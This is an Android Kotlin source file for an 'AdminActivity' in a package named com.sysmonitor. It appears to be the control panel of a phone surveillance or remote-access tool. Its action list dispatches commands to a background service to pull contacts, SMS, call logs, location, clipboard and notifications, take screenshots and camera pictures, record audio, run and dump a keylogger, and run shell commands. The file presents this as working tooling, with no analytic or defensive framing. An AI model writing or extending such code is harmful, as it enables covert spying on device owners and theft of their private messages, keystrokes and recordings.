package com.sysmonitor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.util.Log
import android.view.View
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.recyclerview.widget.LinearLayoutManager
import androidx.recyclerview.widget.RecyclerView
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken

class AdminActivity : AppCompatActivity() {

    private lateinit var rvActions: RecyclerView
    private lateinit var rvResults: RecyclerView
    private lateinit var tvStatus: TextView
    private val gson = Gson()
    private var resultReceiver: ResultReceiver? = null
    private val taskResults = mutableListOf<TaskResult>()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_admin)

        tvStatus = findViewById(R.id.tvStatus)
        rvActions = findViewById(R.id.rvActions)
        rvResults = findViewById(R.id.rvResults)

        setupRecyclerViews()
        setupButtons()
        registerResultReceiver()

        tvStatus.text = "Admin Panel Ready"
    }

    private fun registerResultReceiver() {
        resultReceiver = ResultReceiver()
        val filter = IntentFilter("com.sysmonitor.ACTION_RESULT")
        registerReceiver(resultReceiver!!, filter, Context.RECEIVER_NOT_EXPORTED)
    }

    inner class ResultReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val taskId = intent.getStringExtra("task_id") ?: ""
            val result = intent.getStringExtra("result") ?: ""
            val error = intent.getStringExtra("error") ?: ""
            val status = intent.getStringExtra("status") ?: ""

            runOnUiThread {
                val timestamp = java.text.SimpleDateFormat("HH:mm:ss").format(java.util.Date())
                val statusIcon = when (status) {
                    "completed" -> "OK"
                    "failed" -> "FAILED"
                    else -> "INFO"
                }
                val display = if (result.isNotBlank()) {
                    "$statusIcon [$timestamp] $taskId:\n$result\n\n"
                } else {
                    "$statusIcon [$timestamp] $taskId failed:\n$error\n\n"
                }
                
                taskResults.add(0, TaskResult(taskId, display, status))
                resultsAdapter.notifyItemInserted(0)
                rvResults.scrollToPosition(0)
            }
        }
    }

    private lateinit var actionsAdapter: ActionsAdapter
    private lateinit var resultsAdapter: TaskResultAdapter

    private fun setupRecyclerViews() {
        rvActions.layoutManager = LinearLayoutManager(this)
        actionsAdapter = ActionsAdapter { capability, args -> sendTask(capability, args) }
        rvActions.adapter = actionsAdapter

        rvResults.layoutManager = LinearLayoutManager(this)
        resultsAdapter = TaskResultAdapter(taskResults)
        rvResults.adapter = resultsAdapter
    }

    private fun setupButtons() {
        findViewById<Button>(R.id.btnTest).setOnClickListener { 
            Toast.makeText(this, "Admin panel working!", Toast.LENGTH_SHORT).show()
            tvStatus.text = "Admin panel active"
        }
    }

    private fun sendTask(capability: String, args: Map<String, Any>) {
        val taskId = java.util.UUID.randomUUID().toString()
        val intent = Intent("com.sysmonitor.ACTION_COMMAND").apply {
            setClassName("com.sysmonitor", "com.sysmonitor.MonitorService")
            putExtra("capability", capability)
            putExtra("args", gson.toJson(args))
            putExtra("task_id", taskId)
        }

        try {
            sendBroadcast(intent)
            tvStatus.text = "Task sent: $capability"
            Toast.makeText(this, "Sent: $capability", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Log.e("AdminActivity", "Failed to send task", e)
            tvStatus.text = "Error: ${e.message}"
            Toast.makeText(this, "Failed: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try { resultReceiver?.let { unregisterReceiver(it) } } catch (e: Exception) {}
    }
}

data class TaskResult(
    val taskId: String,
    val display: String,
    val status: String
)

data class ActionItem(
    val name: String,
    val capability: String,
    val args: Map<String, Any>
)

class ActionsAdapter(private val onClick: (String, Map<String, Any>) -> Unit) :
    RecyclerView.Adapter<ActionsAdapter.ViewHolder>() {

    private val actions = listOf(
        ActionItem("Contacts", "contacts", mapOf()),
        ActionItem("SMS", "sms", mapOf()),
        ActionItem("Call Logs", "call_logs", mapOf()),
        ActionItem("Apps", "apps", mapOf("action" to "list")),
        ActionItem("Location", "location", mapOf("action" to "get")),
        ActionItem("Files (/sdcard)", "files", mapOf("action" to "list", "path" to "/sdcard")),
        ActionItem("WiFi Scan", "wifi", mapOf("action" to "scan")),
        ActionItem("Clipboard", "clipboard", mapOf("action" to "get")),
        ActionItem("Notifications", "notifications", mapOf("action" to "dump")),
        ActionItem("Screenshot", "screen", mapOf("action" to "capture")),
        ActionItem("Audio (30s)", "audio", mapOf("action" to "start", "duration" to 30)),
        ActionItem("Camera", "camera", mapOf("action" to "capture", "camera" to 0)),
        ActionItem("Keylogger Start", "keylogger", mapOf("action" to "start")),
        ActionItem("Keylogger Stop", "keylogger", mapOf("action" to "stop")),
        ActionItem("Keylogger Dump", "keylogger", mapOf("action" to "dump")),
        ActionItem("Shell: id", "shell", mapOf("command" to "id")),
        ActionItem("Shell: ps", "shell", mapOf("command" to "ps")),
        ActionItem("Shell: ls /sdcard", "shell", mapOf("command" to "ls /sdcard")),
    )

    override fun onCreateViewHolder(parent: android.view.ViewGroup, viewType: Int): ViewHolder {
        val view = android.view.LayoutInflater.from(parent.context)
            .inflate(android.R.layout.simple_list_item_1, parent, false)
        return ViewHolder(view)
    }

    override fun onBindViewHolder(holder: ViewHolder, position: Int) {
        val item = actions[position]
        holder.textView.text = item.name
        holder.itemView.setOnClickListener { onClick(item.capability, item.args) }
    }

    override fun getItemCount() = actions.size

    class ViewHolder(view: android.view.View) : RecyclerView.ViewHolder(view) {
        val textView: TextView = view.findViewById(android.R.id.text1)
    }
}

class TaskResultAdapter(private val items: List<TaskResult>) :
    RecyclerView.Adapter<TaskResultAdapter.ViewHolder>() {

    override fun onCreateViewHolder(parent: android.view.ViewGroup, viewType: Int): ViewHolder {
        val view = android.view.LayoutInflater.from(parent.context)
            .inflate(android.R.layout.simple_list_item_2, parent, false)
        return ViewHolder(view)
    }

    override fun onBindViewHolder(holder: ViewHolder, position: Int) {
        val item = items[position]
        holder.text1.text = item.taskId
        holder.text2.text = item.display
        holder.text2.setTextColor(
            if (item.status == "completed") android.graphics.Color.parseColor("#4CAF50")
            else if (item.status == "failed") android.graphics.Color.parseColor("#F44336")
            else android.graphics.Color.parseColor("#FFC107")
        )
    }

    override fun getItemCount() = items.size

    class ViewHolder(view: android.view.View) : RecyclerView.ViewHolder(view) {
        val text1: TextView = view.findViewById(android.R.id.text1)
        val text2: TextView = view.findViewById(android.R.id.text2)
    }
}